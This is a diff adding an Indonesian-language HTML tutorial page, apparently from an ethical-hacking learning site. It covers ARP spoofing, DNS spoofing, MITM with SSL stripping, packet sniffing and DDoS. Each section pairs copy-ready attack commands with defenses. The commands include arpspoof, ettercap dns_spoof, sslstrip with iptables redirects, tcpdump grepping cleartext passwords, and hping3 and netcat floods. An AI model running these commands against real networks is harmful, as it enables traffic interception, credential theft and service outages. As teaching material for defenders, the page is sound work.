@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security - Serangan & Pertahanan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; line-height: 1.6; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        header { text-align: center; color: white; margin-bottom: 40px; animation: slideDown 0.6s ease-out; }
+        header h1 { font-size: 3em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        header p { font-size: 1.2em; opacity: 0.9; }
+        .main-menu { margin-top: 20px; }
+        .main-menu ul { list-style: none; display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
+        .main-menu a { color: white; text-decoration: none; padding: 10px 20px; border-radius: 5px; background: rgba(255, 255, 255, 0.1); transition: all 0.3s ease; font-weight: 500; border: 2px solid transparent; }
+        .main-menu a:hover { background: rgba(255, 255, 255, 0.2); border-color: white; transform: translateY(-2px); }
+        .section { background: white; border-radius: 10px; padding: 25px; margin: 20px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.2); animation: fadeIn 0.6s ease-out; }
+        .section h2 { color: #667eea; margin-bottom: 20px; border-bottom: 3px solid #764ba2; padding-bottom: 10px; }
+        .attack-card { background: #ffebee; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #E91E63; }
+        .defense-card { background: #e8f5e9; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #4CAF50; }
+        .code-block { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.9em; margin: 15px 0; position: relative; }
+        .code-block button { position: absolute; top: 10px; right: 10px; background: #4CAF50; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 0.8em; }
+        .code-block button:hover { background: #45a049; }
+        .info-list { list-style: none; padding: 0; margin: 15px 0; }
+        .info-list li { padding: 12px 0; padding-left: 25px; position: relative; color: #666; }
+        .info-list li:before { content: "→"; position: absolute; left: 0; color: #667eea; font-weight: bold; }
+        .comparison-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        .comparison-table th { background: #667eea; color: white; padding: 12px; text-align: left; }
+        .comparison-table td { padding: 12px; border-bottom: 1px solid #ddd; }
+        .comparison-table tr:nth-child(even) { background: #f8f9fa; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        footer { text-align: center; color: white; margin-top: 40px; padding: 20px; border-top: 1px solid rgba(255,255,255,0.3); }
+        .threat-level { display: inline-block; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.8em; margin: 0 5px; }
+        .threat-critical { background: #f44336; color: white; }
+        .threat-high { background: #ff9800; color: white; }
+        .threat-medium { background: #ffc107; color: black; }
+        .threat-low { background: #4CAF50; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🌐 Network Security Attacks</h1>
+            <p>Panduan Lengkap Serangan & Pertahanan Jaringan</p>
+            <nav class="main-menu">
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="network-security.html">Network Security</a></li>
+                    <li><a href="methodology.html">Methodology</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <!-- ARP SPOOFING -->
+        <section class="section">
+            <h2>🎯 ARP Spoofing / ARP Poisoning</h2>
+            <div class="attack-card">
+                <h3>Ancaman: <span class="threat-level threat-high">HIGH</span></h3>
+                <p>ARP (Address Resolution Protocol) spoofing adalah teknik untuk mengirim gratuitous ARP requests dengan MAC address yang palsu, sehingga mengarahkan traffic ke attacker.</p>
+
+                <h4>Bagaimana Cara Kerjanya:</h4>
+                <div class="info-list">
+                    <li>Attacker mengirim fake ARP reply ke target</li>
+                    <li>Target memetakan IP address ke MAC address attacker</li>
+                    <li>Traffic diinterseptasi oleh attacker</li>
+                    <li>Bisa mengakses unencrypted data (passwords, credentials)</li>
+                </div>
+
+                <h4>Perintah Menggunakan Arpspoof (dari Dsniff):</h4>
+                <div class="code-block">
+# Intercept traffic antara gateway & target
+arpspoof -i eth0 -t [TARGET_IP] [GATEWAY_IP]
+
+# Jalankan di terminal lain untuk intercept balik
+arpspoof -i eth0 -t [GATEWAY_IP] [TARGET_IP]
+
+# Enable IP forwarding untuk MITM
+echo 1 > /proc/sys/net/ipv4/ip_forward
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+
+                <h4>Menggunakan Ettercap:</h4>
+                <div class="code-block">
+# Interactive mode
+ettercap -G
+
+# Command line dengan target specific
+ettercap -T -q -i eth0 -M arp:remote /TARGET1_IP/ /TARGET2_IP/
+
+# Hanya sniffing tanpa MITM
+ettercap -T -q -i eth0 /TARGET_IP/
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="defense-card">
+                <h3>⛔ Proteksi & Deteksi</h3>
+                <div class="info-list">
+                    <li><strong>Static ARP Entries:</strong> Configure static ARP untuk critical devices</li>
+                    <li><strong>ARP Monitoring:</strong> Gunakan tools seperti Snort/Suricata untuk alert</li>
+                    <li><strong>DHCP Snooping:</strong> Cegah ARP replies dari non-authorized sources</li>
+                    <li><strong>Port Security:</strong> Limit MAC addresses per port di switch</li>
+                    <li><strong>VPN/SSL:</strong> Encrypt traffic untuk mencegah sniffing</li>
+                    <li><strong>ARP Guard:</strong> Deploy dedicated ARP monitoring tools</li>
+                </div>
+
+                <h4>Deteksi dengan Wireshark:</h4>
+                <div class="code-block">
+# Filter untuk melihat ARP requests
+arp
+
+# Alert jika MAC mapping berubah
+arp.duplicate-address-detected
+
+# Monitor semua ARP activity
+arp && (arp.opcode == 1 or arp.opcode == 2)
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- DNS SPOOFING / HIJACKING -->
+        <section class="section">
+            <h2>🔗 DNS Spoofing & DNS Hijacking</h2>
+            <div class="attack-card">
+                <h3>Ancaman: <span class="threat-level threat-high">HIGH</span></h3>
+                <p>DNS spoofing mengarahkan DNS queries ke IP address palsu, memaksa users untuk visit malicious website.</p>
+
+                <h4>Attack Vectors:</h4>
+                <div class="info-list">
+                    <li>DNS cache poisoning - corrupt resolver cache</li>
+                    <li>Redirect DNS queries ke malicious DNS server</li>
+                    <li>Man-in-the-middle DNS interception</li>
+                    <li>Rebinding attacks - make browser connect ke internal IPs</li>
+                </div>
+
+                <h4>Melakukan DNS Spoofing dengan Ettercap:</h4>
+                <div class="code-block">
+# 1. Edit DNS filter file
+nano /etc/ettercap/etter.dns
+
+# Tambahkan mapping:
+example.com A 192.168.1.100
+*.example.com A 192.168.1.100
+
+# 2. Jalankan ettercap dengan DNS plugin
+ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /TARGET_IP/ /GATEWAY_IP/
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+
+                <h4>Menggunakan dnschef (untuk DNS response modification):</h4>
+                <div class="code-block">
+# Basic DNS spoofing
+dnschef -i 0.0.0.0 -c "A=192.168.1.100"
+
+# Spoof specific domains
+dnschef -i 0.0.0.0 --fakeip 192.168.1.100 -d example.com
+
+# Dengan iptables redirect
+iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="defense-card">
+                <h3>⛔ Proteksi & Deteksi</h3>
+                <div class="info-list">
+                    <li><strong>DNSSEC:</strong> Cryptographic signing dari DNS records</li>
+                    <li><strong>DNS Monitoring:</strong> Alert pada unusual DNS queries</li>
+                    <li><strong>Trusted DNS Server:</strong> Use corporate DNS dengan security controls</li>
+                    <li><strong>HTTPS Only:</strong> Certificate pinning untuk critical sites</li>
+                    <li><strong>DNS Query Logging:</strong> Monitor dan analyze DNS patterns</li>
+                    <li><strong>Update Hosts File:</strong> Add critical mappings ke local hosts</li>
+                </div>
+
+                <h4>Deteksi Anomali DNS dengan Zeek:</h4>
+                <div class="code-block">
+# Monitor DNS queries dalam logs
+zeek -r capture.pcap dns
+
+# Lookfor unusual domains
+zeek -r capture.pcap policy/protocols/dns/dns-query-count.zeek
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- MITM ATTACKS -->
+        <section class="section">
+            <h2>🔄 Man-in-the-Middle (MITM) Attacks</h2>
+            <div class="attack-card">
+                <h3>Ancaman: <span class="threat-level threat-critical">CRITICAL</span></h3>
+                <p>Attacker memposisikan dirinya di antara dua communicating parties untuk intercept & modify traffic.</p>
+
+                <h4>Jenis-jenis MITM Attacks:</h4>
+                <div class="info-list">
+                    <li><strong>ARP Spoofing:</strong> Poisoning ARP tables</li>
+                    <li><strong>DNS Hijacking:</strong> Redirect ke malicious sites</li>
+                    <li><strong>SSL Stripping:</strong> Downgrade HTTPS ke HTTP</li>
+                    <li><strong>Rogue WiFi Access Point:</strong> Create fake WiFi hotspot</li>
+                    <li><strong>BGP Hijacking:</strong> Redirect internet traffic di level routing</li>
+                </div>
+
+                <h4>SSL Stripping Attack (sslstrip):</h4>
+                <div class="code-block">
+# 1. Setup MITM dengan ARP spoofing
+arpspoof -i eth0 -t [TARGET] [GATEWAY]
+
+# 2. Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 3. Redirect HTTP traffic ke sslstrip
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888
+
+# 4. Jalankan sslstrip
+sslstrip -p
+
+# SSL traffic akan di-downgrade ke HTTP
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="defense-card">
+                <h3>⛔ Proteksi & Deteksi</h3>
+                <div class="info-list">
+                    <li><strong>HSTS (HTTP Strict Transport Security):</strong> Force HTTPS</li>
+                    <li><strong>Certificate Pinning:</strong> Lock ke specific certificate</li>
+                    <li><strong>VPN/TLS:</strong> Encrypt semua communication</li>
+                    <li><strong>Network Segmentation:</strong> Isolate sensitive systems</li>
+                    <li><strong>MAC Filtering:</strong> Only known devices on network</li>
+                    <li><strong>Monitor ARP Tables:</strong> Alert pada unexpected changes</li>
+                    <li><strong>802.1X Authentication:</strong> Port-based network access control</li>
+                </div>
+            </div>
+        </section>
+
+        <!-- PACKET SNIFFING -->
+        <section class="section">
+            <h2>📦 Packet Sniffing & Network Eavesdropping</h2>
+            <div class="attack-card">
+                <h3>Ancaman: <span class="threat-level threat-high">HIGH</span></h3>
+                <p>Mengcapture network traffic untuk extract sensitive information seperti passwords, tokens, atau data.</p>
+
+                <h4>Menggunakan Wireshark (GUI):</h4>
+                <div class="code-block">
+# Install wireshark
+sudo apt install wireshark
+
+# Jalankan
+wireshark
+
+# Atau capture langsung ke file
+sudo wireshark -k -i eth0 -w capture.pcap
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+
+                <h4>Menggunakan tcpdump (Command Line):</h4>
+                <div class="code-block">
+# Capture semua traffic
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Filter untuk HTTP traffic
+sudo tcpdump -i eth0 'tcp port 80' -w http.pcap
+
+# Capture passwords dalam clear text
+sudo tcpdump -i eth0 -A 'tcp port 21 or tcp port 23 or tcp port 80' | grep -i pass
+
+# Monitor HTTPS SNI (server names)
+sudo tcpdump -i eth0 -A 'tcp port 443' | grep -oP '(?<=SNI=)[^,]+'
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+
+                <h4>Sensitive Data dalam Network Traffic:</h4>
+                <table class="comparison-table">
+                    <tr>
+                        <th>Protocol</th>
+                        <th>Port</th>
+                        <th>Encryption</th>
+                        <th>Risk</th>
+                    </tr>
+                    <tr>
+                        <td>HTTP</td>
+                        <td>80</td>
+                        <td>None</td>
+                        <td>Critical - All data visible</td>
+                    </tr>
+                    <tr>
+                        <td>FTP</td>
+                        <td>21</td>
+                        <td>None</td>
+                        <td>Critical - Credentials visible</td>
+                    </tr>
+                    <tr>
+                        <td>Telnet</td>
+                        <td>23</td>
+                        <td>None</td>
+                        <td>Critical - Everything visible</td>
+                    </tr>
+                    <tr>
+                        <td>SMTP (unencrypted)</td>
+                        <td>25/587</td>
+                        <td>Optional</td>
+                        <td>High - Email content visible</td>
+                    </tr>
+                    <tr>
+                        <td>HTTPS</td>
+                        <td>443</td>
+                        <td>TLS/SSL</td>
+                        <td>Low - Encrypted</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="defense-card">
+                <h3>⛔ Proteksi & Deteksi</h3>
+                <div class="info-list">
+                    <li><strong>Network Segmentation:</strong> Divide networks untuk limit sniffing</li>
+                    <li><strong>Switched Networks:</strong> Use switches bukannya hubs</li>
+                    <li><strong>Encryption:</strong> TLS/SSL untuk semua sensitive data</li>
+                    <li><strong>VPN:</strong> Encrypt all traffic end-to-end</li>
+                    <li><strong>Network IDS:</strong> Suricata/Snort untuk detect suspicious patterns</li>
+                    <li><strong>IPS (Intrusion Prevention):</strong> Active blocking dari malicious traffic</li>
+                    <li><strong>Monitor Network Interfaces:</strong> Alert jika device dalam promiscuous mode</li>
+                </div>
+            </div>
+        </section>
+
+        <!-- DDoS ATTACKS -->
+        <section class="section">
+            <h2>💥 DDoS (Distributed Denial of Service)</h2>
+            <div class="attack-card">
+                <h3>Ancaman: <span class="threat-level threat-critical">CRITICAL</span></h3>
+                <p>Overload target dengan traffic untuk membuat service unavailable.</p>
+
+                <h4>Jenis-jenis DDoS:</h4>
+                <div class="info-list">
+                    <li><strong>Volumetric:</strong> Overwhelming bandwidth (UDP floods, ICMP floods)</li>
+                    <li><strong>Protocol:</strong> Exploit protocol weaknesses (SYN floods, Ping of Death)</li>
+                    <li><strong>Application:</strong> Target aplikasi layer (HTTP floods, DNS amplification)</li>
+                </div>
+
+                <h4>SYN Flood Attack:</h4>
+                <div class="code-block">
+# Using hping3 untuk generate SYN packets
+hping3 -S --flood -p 80 [TARGET_IP]
+
+# Spoofed source IP
+hping3 -S -p 80 --spoof [SPOOFED_IP] --flood [TARGET_IP]
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+
+                <h4>UDP Flood:</h4>
+                <div class="code-block">
+# Using hping3 untuk UDP flood
+hping3 -2 --flood -p 53 [TARGET_IP]
+
+# Using netcat
+nc -u -l 0.0.0.0 53 < /dev/zero | nc -u [TARGET_IP] 53
+                    <button onclick="copyToClipboard(this)">Copy</button>
+                </div>
+            </div>
+
+            <div class="defense-card">
+                <h3>⛔ Proteksi & Deteksi</h3>
+                <div class="info-list">
+                    <li><strong>DDoS Mitigation Service:</strong> Cloudflare, Akamai, AWS Shield</li>
+                    <li><strong>Rate Limiting:</strong> Limit requests per IP/second</li>
+                    <li><strong>Firewalls:</strong> Block suspicious traffic patterns</li>
+                    <li><strong>Load Balancing:</strong> Distribute traffic across servers</li>
+                    <li><strong>IDS/IPS:</strong> Detect & block attack signatures</li>
+                    <li><strong>BGP Flowspec:</strong> Remote triggered black hole routing</li>
+                    <li><strong>Traffic Scrubbing:</strong> Clean traffic di upstream</li>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>&copy; 2026 Ethical Hacker Roadmap | Network Security</p>
+            <p><a href="index.html" style="color: white; text-decoration: underline;">← Back to Home</a></p>
+        </footer>
+    </div>
+
+    <script>
+        function copyToClipboard(button) {
+            const code = button.parentElement.innerText.replace('Copy', '').trim();
+            navigator.clipboard.writeText(code).then(() => {
+                const originalText = button.innerText;
+                button.innerText = '✓ Copied!';
+                setTimeout(() => { button.innerText = originalText; }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
